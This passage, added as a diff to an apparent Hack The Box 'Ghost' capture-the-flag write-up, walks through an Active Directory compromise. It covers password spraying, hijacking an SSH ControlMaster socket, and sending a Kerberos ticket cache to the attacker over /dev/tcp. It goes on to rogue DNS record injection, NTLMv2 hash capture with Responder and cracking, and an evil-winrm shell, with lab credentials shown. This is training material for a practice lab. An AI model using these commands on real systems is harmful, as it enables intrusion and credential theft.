@@ -762,6 +762,273 @@ _=/usr/bin/env
 
 
 
+```bash
+❯ nxc smb 10.10.11.24 -u users.txt -p 'He!KA9oKVT3rL99j' --continue-on-success
+SMB         10.10.11.24     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.24     445    DC01             [-] ghost.htb\kathryn.holland:He!KA9oKVT3rL99j STATUS_LOGON_FAILURE 
+SMB         10.10.11.24     445    DC01             [-] ghost.htb\cassandra.shelton:He!KA9oKVT3rL99j STATUS_LOGON_FAILURE 
+SMB         10.10.11.24     445    DC01             [-] ghost.htb\robert.steeves:He!KA9oKVT3rL99j STATUS_LOGON_FAILURE 
+SMB         10.10.11.24     445    DC01             [-] ghost.htb\florence.ramirez:He!KA9oKVT3rL99j STATUS_LOGON_FAILURE 
+SMB         10.10.11.24     445    DC01             [-] ghost.htb\justin.bradley:He!KA9oKVT3rL99j STATUS_LOGON_FAILURE 
+SMB         10.10.11.24     445    DC01             [-] ghost.htb\arthur.boyd:He!KA9oKVT3rL99j STATUS_LOGON_FAILURE 
+SMB         10.10.11.24     445    DC01             [-] ghost.htb\beth.clark:He!KA9oKVT3rL99j STATUS_LOGON_FAILURE 
+SMB         10.10.11.24     445    DC01             [-] ghost.htb\charles.gray:He!KA9oKVT3rL99j STATUS_LOGON_FAILURE 
+SMB         10.10.11.24     445    DC01             [-] ghost.htb\jason.taylor:He!KA9oKVT3rL99j STATUS_LOGON_FAILURE 
+SMB         10.10.11.24     445    DC01             [+] ghost.htb\intranet_principal:He!KA9oKVT3rL99j 
+SMB         10.10.11.24     445    DC01             [-] ghost.htb\gitea_temp_principal:He!KA9oKVT3rL99j STATUS_LOGON_FAILURE 
+```
+
+
+
+```bash
+root@36b733906694:/# ls -l
+total 76
+drwxr-xr-x   1 root root 4096 Jul  5  2024 app
+lrwxrwxrwx   1 root root    7 Jul  1  2024 bin -> usr/bin
+drwxr-xr-x   2 root root 4096 Mar 29  2024 boot
+drwxr-xr-x   5 root root  340 Feb  7 17:46 dev
+-rwxr-xr-x   1 root root  215 Jul 22  2024 docker-entrypoint.sh
+drwxr-xr-x   1 root root 4096 Jul 22  2024 etc
+drwxr-xr-x   2 root root 4096 Mar 29  2024 home
+lrwxrwxrwx   1 root root    7 Jul  1  2024 lib -> usr/lib
+lrwxrwxrwx   1 root root    9 Jul  1  2024 lib64 -> usr/lib64
+drwxr-xr-x   2 root root 4096 Jul  1  2024 media
+drwxr-xr-x   2 root root 4096 Jul  1  2024 mnt
+drwxr-xr-x   2 root root 4096 Jul  1  2024 opt
+dr-xr-xr-x 196 root root    0 Feb  7 17:46 proc
+drwx------   1 root root 4096 Jul  5  2024 root
+drwxr-xr-x   1 root root 4096 Jul  5  2024 run
+lrwxrwxrwx   1 root root    8 Jul  1  2024 sbin -> usr/sbin
+drwxr-xr-x   2 root root 4096 Jul  1  2024 srv
+dr-xr-xr-x  13 root root    0 Feb  7 17:46 sys
+drwxrwxrwt   1 root root 4096 Jul  5  2024 tmp
+drwxr-xr-x   1 root root 4096 Jul  1  2024 usr
+drwxr-xr-x   1 root root 4096 Jul  1  2024 var
+root@36b733906694:/# cat docker-entrypoint.sh 
+#!/bin/bash
+
+mkdir /root/.ssh
+mkdir /root/.ssh/controlmaster
+printf 'Host *\n  ControlMaster auto\n  ControlPath ~/.ssh/controlmaster/%%r@%%h:%%p\n  ControlPersist yes' > /root/.ssh/config
+
+exec /app/ghost_intranet
+```
+
+
+
+```bash
+root@36b733906694:~/.ssh/controlmaster# ls -la
+total 12
+drwxr-xr-x 1 root root 4096 Feb  7 17:47 .
+drwxr-xr-x 1 root root 4096 Jul  5  2024 ..
+srw------- 1 root root    0 Feb  7 17:47 florence.ramirez@ghost.htb@dev-workstation:22
+root@36b733906694:~/.ssh/controlmaster# file florence.ramirez\@ghost.htb\@dev-workstation\:22 
+florence.ramirez@ghost.htb@dev-workstation:22: socket
+```
+
+
+
+```bash
+root@36b733906694:~/.ssh/controlmaster# ssh -O check -S ~/.ssh/controlmaster/florence.ramirez@ghost.htb@dev-workstation:22 florence.ramirez@ghost.htb
+Master running (pid=24)
+florence.ramirez@LINUX-DEV-WS01:~$ hostname -I
+172.18.0.2 
+florence.ramirez@LINUX-DEV-WS01:~$ id
+uid=50(florence.ramirez) gid=50(staff) groups=50(staff),51(it)
+```
+
+
+
+```bash
+florence.ramirez@LINUX-DEV-WS01:~$ id
+uid=50(florence.ramirez) gid=50(staff) groups=50(staff),51(it)
+florence.ramirez@LINUX-DEV-WS01:~$ env
+SHELL=/bin/bash
+PWD=/home/GHOST/florence.ramirez
+KRB5CCNAME=FILE:/tmp/krb5cc_50
+LOGNAME=florence.ramirez
+MOTD_SHOWN=pam
+HOME=/home/GHOST/florence.ramirez
+SSH_CONNECTION=172.18.0.3 54228 172.18.0.2 22
+TERM=xterm
+USER=florence.ramirez
+SHLVL=1
+SSH_CLIENT=172.18.0.3 54228 22
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+SSH_TTY=/dev/pts/0
+_=/usr/bin/env
+```
+
+
+
+```bash
+florence.ramirez@LINUX-DEV-WS01:/tmp$ ls -la krb5cc_50 
+-rw------- 1 florence.ramirez staff 1650 Feb  7 19:49 krb5cc_50
+```
+
+
+
+```bash
+❯ nc -nlvp 443 > krb5cc_50
+listening on [any] 443 ...
+```
+
+
+
+```bash
+florence.ramirez@LINUX-DEV-WS01:/tmp$ cat krb5cc_50 > /dev/tcp/10.10.16.7/443
+```
+
+
+
+```bash
+❯ ls -l krb5cc_50
+.rw-rw-r-- kali kali 1.6 KB Fri Feb  7 20:51:29 2025  krb5cc_50
+❯ file krb5cc_50
+krb5cc_50: data
+```
+
+
+
+```bash
+❯ export KRB5CCNAME=$(pwd)/krb5cc_50
+❯ klist -i
+Ticket cache: FILE:/home/kali/Desktop/HackTheBox/Windows/AD/Ghost/content/krb5cc_50
+Default principal: florence.ramirez@GHOST.HTB
+
+Valid starting     Expires            Service principal
+07/02/25 20:51:02  08/02/25 06:51:02  krbtgt/GHOST.HTB@GHOST.HTB
+	renew until 08/02/25 20:51:01
+```
+
+
+
+```bash
+❯ nxc smb 10.10.11.24 -u 'florence.ramirez' -k --use-kcache
+SMB         10.10.11.24     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.24     445    DC01             [+] ghost.htb\florence.ramirez from ccache 
+```
+
+
+
+
+
+<figure><img src="../../.gitbook/assets/4590_vmware_FS9P8EQFLV.png" alt=""><figcaption></figcaption></figure>
+
+
+
+```bash
+❯ bloodyAD --host dc01.ghost.htb -d ghost.htb -k get dnsDump
+
+zoneName: ghost.htb
+
+SOA.PrimaryServer: dc01.ghost.htb
+SOA.zoneAdminEmail: hostmaster@ghost.htb
+NS: dc01.ghost.htb
+A: 10.0.0.254; 127.0.0.1; 10.10.11.24
+recordName: ghost.htb
+
+recordName: _gc._tcp.ghost.htb
+SRV: primary.corp.ghost.htb:3268; dc01.ghost.htb:3268
+
+recordName: _gc._tcp.Default-First-Site-Name._sites.ghost.htb
+SRV: primary.corp.ghost.htb:3268; dc01.ghost.htb:3268
+
+recordName: _kerberos._tcp.ghost.htb
+SRV: dc01.ghost.htb:88
+...[snip]...
+```
+
+
+
+```bash
+❯ bloodyAD --host dc01.ghost.htb -d ghost.htb -k get dnsDump > dnsDump.txt
+❯ grep 'bitbucket' dnsDump.txt
+```
+
+
+
+```bash
+❯ bloodyAD --host dc01.ghost.htb -d ghost.htb -k add dnsRecord bitbucket 10.10.16.7
+[+] bitbucket has been successfully added
+```
+
+
+
+```bash
+❯ sudo responder -I tun0
+...[snip]...
+[+] Listening for events...
+
+[HTTP] NTLMv2 Client   : 10.10.11.24
+[HTTP] NTLMv2 Username : ghost\justin.bradley
+[HTTP] NTLMv2 Hash     : justin.bradley::ghost:379fd6cc8a217192:57521556E3919754EBD8F3CEF7C53692:010100000000000055A059C39A79DB0196D7986191DE13BA00000000020008005400460043004E0001001E00570049004E002D004D004D004C00550059003000520039004F004E003500040014005400460043004E002E004C004F00430041004C0003003400570049004E002D004D004D004C00550059003000520039004F004E0035002E005400460043004E002E004C004F00430041004C00050014005400460043004E002E004C004F00430041004C00080030003000000000000000000000000040000076536FB96280E0573AB44A1AC8269946A2295E50D4C33E8D9D4B3161337ACEAC0A001000000000000000000000000000000000000900300048005400540050002F006200690074006200750063006B00650074002E00670068006F00730074002E006800740062000000000000000000
+```
+
+
+
+```bash
+❯ hashcat -a 0 hashes /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting in autodetect mode
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: cpu-sandybridge-11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz, 2913/5891 MB (1024 MB allocatable), 8MCU
+
+...[snip]...
+
+JUSTIN.BRADLEY::ghost:379fd6cc8a217192:57521556e3919754ebd8f3cef7c53692:010100000000000055a059c39a79db0196d7986191de13ba00000000020008005400460043004e0001001e00570049004e002d004d004d004c00550059003000520039004f004e003500040014005400460043004e002e004c004f00430041004c0003003400570049004e002d004d004d004c00550059003000520039004f004e0035002e005400460043004e002e004c004f00430041004c00050014005400460043004e002e004c004f00430041004c00080030003000000000000000000000000040000076536fb96280e0573ab44a1ac8269946a2295e50d4c33e8d9d4b3161337aceac0a001000000000000000000000000000000000000900300048005400540050002f006200690074006200750063006b00650074002e00670068006f00730074002e006800740062000000000000000000:Qwertyuiop1234$$
+```
+
+
+
+```bash
+❯ nxc smb 10.10.11.24 -u 'justin.bradley' -p 'Qwertyuiop1234$$'
+SMB         10.10.11.24     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.24     445    DC01             [+] ghost.htb\justin.bradley:Qwertyuiop1234$$ 
+
+❯ nxc winrm 10.10.11.24 -u 'justin.bradley' -p 'Qwertyuiop1234$$'
+WINRM       10.10.11.24     5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:ghost.htb)
+WINRM       10.10.11.24     5985   DC01             [+] ghost.htb\justin.bradley:Qwertyuiop1234$$ (Pwn3d!)
+```
+
+
+
+```bash
+❯ evil-winrm -i 10.10.11.24 -u 'justin.bradley' -p 'Qwertyuiop1234$$'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\justin.bradley\Documents> type ../Desktop/user.txt
+56ee926c00f4acca83b2f97a05afd868
+```
+
+
+
+
+
+```bash
+❯ impacket-getTGT ghost.htb/justin.bradley:'Qwertyuiop1234$$'
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in justin.bradley.ccache
+❯ export KRB5CCNAME=$(pwd)/justin.bradley.ccache
+❯ klist -i
+Ticket cache: FILE:/home/kali/Desktop/HackTheBox/Windows/AD/Ghost/content/justin.bradley.ccache
+Default principal: justin.bradley@GHOST.HTB
+
+Valid starting     Expires            Service principal
+07/02/25 21:05:32  08/02/25 07:05:32  krbtgt/GHOST.HTB@GHOST.HTB
+	renew until 08/02/25 21:05:06
+```
+
+
+
 
 
 
